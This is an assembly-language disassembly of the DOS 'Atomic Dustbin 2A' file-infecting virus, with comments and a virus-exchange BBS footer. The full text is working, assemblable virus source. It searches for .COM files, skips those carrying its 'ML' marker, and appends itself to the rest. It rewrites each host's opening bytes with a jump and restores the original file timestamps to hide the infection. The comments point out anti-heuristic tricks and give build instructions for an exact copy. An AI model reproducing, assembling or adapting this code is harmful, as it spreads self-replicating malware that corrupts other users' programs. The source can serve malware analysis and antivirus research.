;Disassembly of the Atomic Dustbin 2A virus by Memory Lapse.

;For a byte-to-byte matchup, assemble with TASM /M2.
		
		.model tiny

		.code

		org     100h

start:
		db      0e9h, 02, 00            ;JMP NEAR PTR STARTVIRUS

		db      'ML'                    ;Virus signature.
startvirus:                
		call    get_relative
get_relative:
		pop     bp
		sub     bp,offset get_relative
		
		lea     si,[bp+restore_bytes]

		mov     di,100h
		push    di
		movsw
		movsw
		movsb                           ;Restore start of host.
		mov     ah,4Eh
		lea     dx,[bp+filemask]
		int     21h                     ;Find first.
			       
		jc      quit_virus
		
		call    try_infect

loc_2:
		mov     ah,4Fh
		int     21h                     ;Find next.
		
		jc      quit_virus
		call    try_infect
		jmp     quit_virus

		nop
		mov     ah,09
		lea     dx, [bp+message]
		int     21h
		int     20h

quit_virus:                
		mov     bp, 100h
		jmp     bp                      ;Restart host.

try_infect:
		mov     ax,3D02h
		mov     dx,9eh                  ;Offset of filename in DTA.
		int     21h                     ;Try to open file in read/write
						;mode.
		
						;No error checking!!

		xchg    bx,ax                   ;Handle more useful in BX.
		
		mov     ax,4200h
		xor     cx,cx
		xor     dx,dx                   ;CWD!
		int     21h                     ;Seek to start, but filepos
						;is already equal to BOF.
		
		mov     ah,3Fh
		mov     cx,5
		lea     dx,[bp+restore_bytes]   ;Read five bytes.
		int     21h
						
		cmp     word ptr cs:[bp+restore_bytes+3],'LM'
		je      loc_2
		mov     ax,5700h
		int     21h                     ;Get file date/time
		
		push    cx
		push    dx                      ;Save it.
		mov     ax,4202h
		xor     cx,cx
		xor     dx,dx                   ;CWD!
		int     21h                     ;Seek to EOF.
		
		push    bx

		sub     ax,3
		lea     bx,[bp+jmpdata]
		mov     [bx],ax                 ;JMP constructed.
		pop     bx
		mov     ah,40h
		mov     cx,(endvirus-startvirus)
		lea     dx,[bp+startvirus]
		int     21h                     ;Attach virus to new host.
		
		mov     ax,4200h
		xor     cx,cx
		xor     dx,dx                   ;CWD!
		int     21h                     ;Back to bof.
		
		mov     ah,40h
		mov     cx,1
		lea     dx,[bp+jump]
		int     21h                     ;Write first byte of jmp.
		
		mov     ax,4200h
		xor     cx,cx
		mov     dx,1                    ;Seek to bof+1.
		int     21h
		
		mov     ah,40h
		mov     cx,4
		lea     dx,[bp+jmpdata]         
		int     21h                     ;And finish the jmp write.
						;(probably some anti-
						;heuristical code)
		
		mov     ax,4200h
		xor     cx,cx
		xor     dx,dx
		int     21h                     ;back to bof AGAIN.
		
		mov     ax,5701h
		pop     dx
		pop     cx
		int     21h                     ;Restore file date/time.
		
		mov     ah,3Eh
		int     21h                     ;Close file - infection
						;complete.
		
		ret

filemask        db      '*.COM', 0             

db      '[TAD2A] Created by Memory Lapse of Ontario, Canada', 0Dh, 0Ah, '$'
   
db      '[TAD2A] The Atomic Dustbin 2A - Just Shake Your Rump!', 0Dh, 0Ah,'$'

message         db      'Fail on INT 24 .. NOT!!', 0Dh, 0Ah,'$'

jump            db      0E9h
jmpdata         dw      0
		
		db      'ML'
		
		db      00h, 00h

restore_bytes:
		int 20h
		nop
		nop
		nop
endvirus:
		end     start

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
